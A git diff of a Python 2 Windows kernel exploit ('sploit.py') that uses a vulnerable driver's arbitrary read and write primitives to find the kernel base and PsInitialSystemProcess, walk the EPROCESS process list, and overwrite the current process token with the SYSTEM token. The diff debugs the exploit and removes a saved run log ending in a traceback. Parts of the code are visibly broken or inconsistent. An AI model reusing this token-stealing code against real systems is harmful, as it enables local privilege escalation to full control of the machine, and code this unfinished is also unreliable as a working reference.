@@ -142,7 +142,7 @@ def getkernelBase(driver):
             kernel_base = hex(tmp.ImageBase)[:-0x01]
             print '[*] Kernel Base: {}'.format(kernel_base)
             
-            return (img_name, int(kernel_base, 0))
+            return (img_name, long(kernel_base, 0))
     counter += sizeof(tmp)
 
 
@@ -161,22 +161,18 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))
 
-    PsISP_user_address = kernel32.GetProcAddress(kernel_handle,
-            'PsInitialSystemProcess')
-    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' \
-        % PsISP_user_address
+    PsISP_user_address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
+    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_user_address
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    system_process_base_pointer = kernel_base + PsISP_user_address \
-        - kernel_handle
-    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' \
-        % system_process_base_pointer
+    system_process_base_pointer = kernel_base + PsISP_user_address - kernel_handle
+    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_process_base_pointer
 
     PsISP_kernel_address = c_ulonglong()
 
 
-    return int(system_process_base_pointer)
+    return long(system_process_base_pointer)
 
 
 ################################################### WRITE ###########################################################
@@ -193,15 +189,15 @@ def writePrimitive(driver, what_addr, where):
 
     # Write the what value to int(what_addr)
 
-    data = struct.pack('<Q', what)
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            int(what_addr), data, len(data), byref(written))
+    #data = struct.pack('<Q', what_addr)
+    #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            #long(what_addr), data, len(data), byref(written))
 
     if dwStatus == 0:
         print ('Something went wrong while writing to memory', 'e')
         sys.exit()
 
-    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
+    data = struct.pack('<Q', long(what_addr)) + struct.pack('<Q', long(where))
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             1, data, len(data), byref(written))
 
@@ -245,8 +241,10 @@ def readPrimitive(driver, what_addr, where):
     lpBytesReturned = byref(dwBytesReturned)
 
                                                             # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
+    print "WHAT: ", type(what_addr), hex(what_addr)
+    print "WHERE: ", type(where), hex(where)
 
-    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
+    data = struct.pack('<QQ', what_addr, where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             user_addr, data, len(data), byref(written))
 
@@ -265,59 +263,58 @@ def readPrimitive(driver, what_addr, where):
         )
 
     print 'Value after: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
+ 
     read_value = cast(user_addr, POINTER(c_ulonglong))[0]
-    print "What the fuck is this read value? " + str(read_value)
+    print type(read_value)
+    print ("Read_value is: " + hex(read_value))
 
-    read_value = c_ulong()
-    return triggerIOCTL
+    #return (triggerIOCTL, read_value)
     return read_value
 
 
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
-unique_process_id_offset = 0x2e0
-active_process_links_offset = 0x2e8
-token_offset = 0x358
-
-
 def get_current_eprocess(system_process_base_pointer, driver):
     """ Returns ptr to Current EPROCESS structure """
+    unique_process_id_offset = 0x2e0
+    active_process_links_offset = 0x2e8
+    token_offset = 0x358
 
-    flink = c_ulonglong()
-    readPrimitive(driver, system_process_base_pointer
-                  + active_process_links_offset, user_addr)
-    
-    current_pEPROCESS = 0
-    while 0x01:
+    flink = readPrimitive(driver, system_process_base_pointer + active_process_links_offset, user_addr)
+    print hex(flink)
+    currentprocessBase = 0
+    while True:
         unique_process_id = c_ulonglong(0)
 
         # Adjust EPROCESS pointer for next entry
 
-        system_process_base_pointer = flink.value \
-            - unique_process_id_offset - 0x8
+        #print("Flink.value {}".format(flink.value))
+        #system_process_base_pointer = flink.value - unique_process_id_offset - 0x8
+        system_process_base_pointer = flink - unique_process_id_offset - 0x8
 
+        print type(system_process_base_pointer), hex(system_process_base_pointer)
         # Get PID
 
-        readPrimitive(driver, system_process_base_pointer
-                      + unique_process_id_offset, user_addr)
+        unique_process_id = readPrimitive(driver, system_process_base_pointer + unique_process_id_offset, user_addr)
 
         
         # Check if we're in the current process
 
         if os.getpid() == unique_process_id.value:
-            current_pEPROCESS = system_process_base_pointer
+            currentprocessBase = system_process_base_pointer
             break
 
-        readPrimitive(driver, system_process_base_pointer
+        flink = readPrimitive(driver, system_process_base_pointer
                       + active_process_links_offset, user_addr)
 
         # If next same as last, we've reached the end
 
-        if system_process_base_pointer == flink.value \
-            - unique_process_id_offset - 0x8:
+        #base_pointer = flink.value - unique_process_id_offset - 0x8
+        base_pointer = flink - unique_process_id_offset - 0x8
+        if base_pointer == system_process_base_pointer:
             break
 
-    return currentprocessBase
+    return long(currentprocessBase)
 
 ####################################### GET DRIVER HANDLE ######################################
 def getDriver():
@@ -355,26 +352,28 @@ def executeOverwrite():
         # Get system process base.
 
         print "MAIN Got Kernel Base, Getting System Process Base!"
-        system_process_base_pointer = \
-            get_PsISP_kernel_address(kernel_base, img_name)
+        system_process_base_pointer = get_PsISP_kernel_address(kernel_base, img_name)
 
         # Read the value of that token.
 
         print "MAIN Got System Process Base, Getting System Token!"
-        read_value = readPrimitive(driver, system_process_base_pointer,
-                                   user_addr)
+        #triggerIOCTL, read_value = readPrimitive(driver, system_process_base_pointer, user_addr)
+
+        read_value = readPrimitive(driver, system_process_base_pointer, user_addr)
 
         # Walk the process list for wherever our process is in memory.
 
         print "MAIN Got System Token, Getting Current Process Base!"
-        currentprocessBase = \
-            get_current_eprocess(system_process_base_pointer, driver)
+        currentprocessBase = get_current_eprocess(system_process_base_pointer, driver)
 
         # Define our expected offsets for this version of Windows.
 
         print "MAIN We know the proper offsets now."
         system_token = system_process_base_pointer + 0x358
         current_token = currentprocessBase + 0x358
+
+        print(system_token)
+        print(current_token)
 
         # Write the system_token over our current_token for SYSTEM privileges.
 
@@ -386,39 +385,3 @@ def executeOverwrite():
 
 executeOverwrite()
 
-'''
-C:\Users\n00b\Desktop>python sploit.py
-MAIN Getting Driver!
-[X] Got handle to the driver.
-
-MAIN Got Driver, getting Kernel Base!
-[*] Calling NtQuerySystemInformation w/SystemModuleInformation
-[*] Success, allocated 55952-byte result buffer
-[*] Result buffer contains 189 SystemModuleInformation objects
-[*] Kernel Type: ntoskrnl.exe
-[*] Kernel Base: 0xfffff80215409000
-MAIN Got Kernel Base, Getting System Process Base!
-[+] Loading ntoskrnl.exe in Userland
-[+] PsInitialSystemProcess Userland Base Address: 0x7FF751D71FA0
-[+] PsInitialSystemProcess Kernel Base Address: 0xFFFFF802157EAFA0
-MAIN Got System Process Base, Getting System Token!
-Value before DeviceIoControl: fffff802157eafa0
-Value after: fffff802157eafa0
-What the fuck is this read value? 18446735286567088032
-Read value is FFFFF802157EAFA0
-MAIN Got System Token, Getting Current Process Base!
-Value before DeviceIoControl: fffff802157eb288
-Value after: fffff802157eb288
-What the fuck is this read value? 18446735286567088776
-Read_value in hex is FFFFF802157EB288
-Traceback (most recent call last):
-  File "sploit.py", line 387, in <module>
-    executeOverwrite()
-  File "sploit.py", line 371, in executeOverwrite
-    get_current_eprocess(system_process_base_pointer, driver)
-  File "sploit.py", line 302, in get_current_eprocess
-    + unique_process_id_offset, user_addr)
-  File "sploit.py", line 249, in readPrimitive
-    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
-struct.error: integer out of range for 'Q' format code
-'''
